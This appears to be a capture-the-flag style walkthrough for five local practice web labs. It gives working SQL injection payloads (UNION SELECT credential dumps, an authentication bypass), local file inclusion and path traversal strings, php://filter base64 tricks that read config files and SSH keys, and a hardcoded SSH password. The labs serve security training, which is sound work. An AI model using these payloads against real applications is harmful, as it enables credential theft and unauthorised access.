#LAB PRACTICE OF SQL INJECTION AND LFI. 

---

## LAB OVERVIEW

| Lab | Site | Web | SSH Port | SSH User | Difficulty | Unique Twist |
|-----|------|-----|----------|----------|------------|--------------|
| Alpha | TravelHub | 9001 | 3331 | traveler | Easy | UNION in category → LFI in template param → renders config.php directly |
| Beta | BidZone | 9002 | 3332 | auctioneer | Medium | UNION on integer id → LFI blocks .php → MUST use php://filter base64 |
| Gamma | QuickBite | 9003 | 3333 | chef | Medium | UNION in category → Path traversal ../../ → config.php has SSH PASSWORD (no key) |
| Delta | CloudStore | 9004 | 3334 | storekeeper | Medium-Hard | AND bracket bypass → LFI reads index.php directly → SQLi reveals key path |
| Epsilon | ResearchPortal | 9005 | 3335 | researcher | Hard | UNION on slug → LFI blocks .php AND /secure/ → base64 needed for BOTH config AND key |

---

## BASE64 CHEAT SHEET (for Beta and Epsilon)

When direct .php access is blocked, use PHP stream wrapper:

```
# Read config.php via base64:
php://filter/convert.base64-encode/resource=config.php

# Read a file in a restricted directory:
php://filter/convert.base64-encode/resource=/var/www/html/secure/.raw_key

# Or for any absolute path:
php://filter/convert.base64-encode/resource=/etc/passwd
```

After getting base64 output, decode it on your terminal:
```bash
echo "BASE64STRINGHERE" | base64 -d
```

---

## LAB ALPHA — TravelHub (Easy)
**Web:** http://localhost:9001
**SSH:** localhost:3331 | user: traveler

### Flag 1 — SQLi → Admin Login
Injection point: `index.php?cat=`  (string, 8 columns)
```
?cat=x' UNION SELECT 1,2,3,4,5,6,7,8-- -
# Find visible column, then dump portal_admins_v2
?cat=x' UNION SELECT 1,group_concat(uname,':',passwd),3,4,5,6,7,8 FROM portal_admins_v2-- -
```
Login → **FLAG1** shown on dashboard

### Flag 2 — LFI in template param
```
dashboard.php?template=config.php
```
config.php renders and shows FLAG2 + SSH key path

### Flag 3 — SSH
```bash
dashboard.php?template=/var/www/html/storage/keys/.traveler_id
# Copy key → save as id_rsa → chmod 600
ssh -i id_rsa traveler@localhost -p 3331
cat flag3.txt
```

---

## LAB BETA — BidZone (Medium)
**Web:** http://localhost:9002
**SSH:** localhost:3332 | user: auctioneer

### Flag 1 — SQLi → Login
Injection point: `index.php?id=` (INTEGER, 7 columns)
```
?id=-1 UNION SELECT 1,2,3,4,5,6,7-- -
?id=-1 UNION SELECT 1,group_concat(login_name,':',login_pass),3,4,5,6,7 FROM site_admins_p7-- -
```
Login → **FLAG1** on dashboard

### Flag 2 — LFI with base64 (direct .php BLOCKED)
Try first: `dashboard.php?view=config.php` → BLOCKED
Use wrapper:
```
dashboard.php?view=php://filter/convert.base64-encode/resource=config.php
```
Decode output:
```bash
echo "PASTEBASE64HERE" | base64 -d
```
FLAG2 + SSH key path visible in decoded config

### Flag 3 — SSH key via base64 wrapper
```
dashboard.php?view=php://filter/convert.base64-encode/resource=/var/www/html/res/private/.auc_key
```
Decode → save as id_rsa → chmod 600
```bash
ssh -i id_rsa auctioneer@localhost -p 3332
cat flag3.txt
```

---

## LAB GAMMA — QuickBite (Medium)
**Web:** http://localhost:9003
**SSH:** localhost:3333 | user: chef

### Flag 1 — SQLi → Login
Injection point: `index.php?cat=` (string, 6 columns)
```
?cat=x' UNION SELECT 1,2,3,4,5,6-- -
?cat=x' UNION SELECT 1,group_concat(username,':',password),3,4,5,6 FROM admin_accounts_w2-- -
```
Login → **FLAG1** on dashboard

### Flag 2 — Path Traversal (no php://filter needed)
Base path is /var/www/html/pages/ — traverse out:
```
dashboard.php?file=../../etc/passwd        ← find users
dashboard.php?file=../../var/www/html/config.php   ← FLAG2 + SSH password
```

### Flag 3 — SSH with PASSWORD (no key!)
Config shows: SSH_USER=chef, SSH_PASS=Ch3fM4ster$Kitchen99
```bash
ssh chef@localhost -p 3333
# Enter password when prompted
cat flag3.txt
```

---

## LAB DELTA — CloudStore (Medium-Hard)
**Web:** http://localhost:9004
**SSH:** localhost:3334 | user: storekeeper

### Flag 1 — AND Bracket Bypass Login
Query: `WHERE (username='$u') AND (password='$p')`
```
Username: ') OR ('1'='1
Password: anything
```
Login → **FLAG1** on dashboard

### Flag 2 — LFI reads index.php directly (source code visible)
```
dashboard.php?page=index.php
```
Source code shows DB credentials embedded in index.php

### Flag 3 — SQLi reveals SSH key path, then LFI reads it
Search SQLi (string, 6 columns):
```
dashboard.php?type=x' UNION SELECT 1,2,3,4,5,6-- -
dashboard.php?type=x' UNION SELECT 1,group_concat(username,':',password,':',ssh_key_path,':',ssh_user),3,4,5,6 FROM system_users_b4-- -
```
Key path revealed: /var/www/html/.hidden/.sk_rsa
```
dashboard.php?page=/var/www/html/.hidden/.sk_rsa
```
Save → chmod 600 → SSH in:
```bash
ssh -i id_rsa storekeeper@localhost -p 3334
cat flag3.txt
```

---

## LAB EPSILON — ResearchPortal (Hard)
**Web:** http://localhost:9005
**SSH:** localhost:3335 | user: researcher

### Flag 1 — SQLi on slug (string, 7 columns)
```
index.php?slug=x' UNION SELECT 1,2,3,4,5,6,7-- -
index.php?slug=x' UNION SELECT 1,group_concat(staff_name,':',access_code),3,4,5,6,7 FROM portal_staff_x3-- -
```
Login → **FLAG1** on dashboard

### Flag 2 — LFI double-blocked (.php AND /secure/ blocked)
Try: `dashboard.php?doc=config.php` → BLOCKED
Try: `dashboard.php?doc=/var/www/html/secure/.raw_key` → BLOCKED
Solution — base64 wrapper bypasses BOTH restrictions:
```
dashboard.php?doc=php://filter/convert.base64-encode/resource=config.php
```
Decode → FLAG2 visible + KEY_STORE path

### Flag 3 — Get SSH key via base64 wrapper
```
dashboard.php?doc=php://filter/convert.base64-encode/resource=/var/www/html/secure/.raw_key
```
Decode the base64 output:
```bash
echo "PASTEBASE64HERE" | base64 -d > id_rsa
chmod 600 id_rsa
ssh -i id_rsa researcher@localhost -p 3335
cat flag3.txt
```

---

## QUICK REFERENCE

### Find column count
```
?param=-1 UNION SELECT NULL-- -
?param=-1 UNION SELECT NULL,NULL-- -
# Keep adding NULL until no error
```

### Find visible column
```
?param=-1 UNION SELECT 1,2,3,4,5,6,7-- -
# Whichever number appears on page = your data column
```

### Standard dump
```
UNION SELECT 1,group_concat(table_name),3,... FROM information_schema.tables WHERE table_schema=database()-- -
UNION SELECT 1,group_concat(column_name),3,... FROM information_schema.columns WHERE table_name='TARGET'-- -
UNION SELECT 1,group_concat(user_col,':',pass_col),3,... FROM target_table-- -
```

### String injection close
- Integer param: no quotes needed, just `?id=-1 UNION...`
- String param: `?slug=x' UNION...-- -`
- Bracket: `?u=') OR ('1'='1`

---

